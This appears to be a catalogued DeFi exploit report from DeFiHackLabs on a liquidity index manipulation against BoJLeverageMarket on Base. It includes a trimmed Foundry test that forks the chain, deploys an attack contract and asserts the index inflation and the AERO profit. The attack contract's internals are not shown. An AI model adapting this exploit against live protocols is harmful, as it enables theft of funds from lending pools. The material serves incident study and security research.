# [?] BoJLeverageMarket - Liquidity Index Manipulation

## Summary
Severity: Unknown
Chain: Base
Component: BoJLeverageMarket
Published: 2025-07-21
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/BoJLeverageMarket_exp.sol
Type: defi-exploit-poc

## Details
Lost: $7,227.59 USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 33_136_655;
        vm.createSelectFork("base", forkBlock);

        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(address(WETH_TOKEN));
        _addFundingToken(address(USDC_TOKEN));
        _addFundingToken(address(AERO_TOKEN));

        vm.label(ATTACKER, "Attacker");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(MORPHO, "Morpho Blue");
        vm.label(BOJ_POOL, "BoJ Pool Proxy");
        vm.label(BOJ_POOL_IMPL, "BoJ Pool Implementation");
        vm.label(BOJ_CBBTC_ATOKEN, "BoJ cbBTC aToken");
        vm.label(address(CBBTC), "cbBTC");
        vm.label(address(AERO_TOKEN), "AERO");
    }

    function testExploit() public balanceLog {
        uint256 aTokenSupplyBefore = IScaledBalanceTokenLite(BOJ_CBBTC_ATOKEN).scaledTotalSupply();
        uint256 indexBefore = IBoJPool(BOJ_POOL).getReserveNormalizedIncome(address(CBBTC));
        uint256 aeroBefore = AERO_TOKEN.balanceOf(ATTACKER);

        assertEq(aTokenSupplyBefore, 0, "cbBTC reserve starts with zero scaled supply");
        assertEq(indexBefore, 1e27, "cbBTC reserve starts at base liquidity index");

        BoJAttack attack = new BoJAttack();
        vm.label(address(attack), "Local Attack Contract");
        attack.execute();

        assertGt(IBoJPool(BOJ_POOL).getReserveNormalizedIncome(address(CBBTC)), indexBefore, "index inflated");
        assertEq(AERO_TOKEN.balanceOf(ATTACKER) - aeroBefore, 3_206_293_935_581_265_143_878, "AERO profit");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/BoJLeverageMarket_exp.sol_
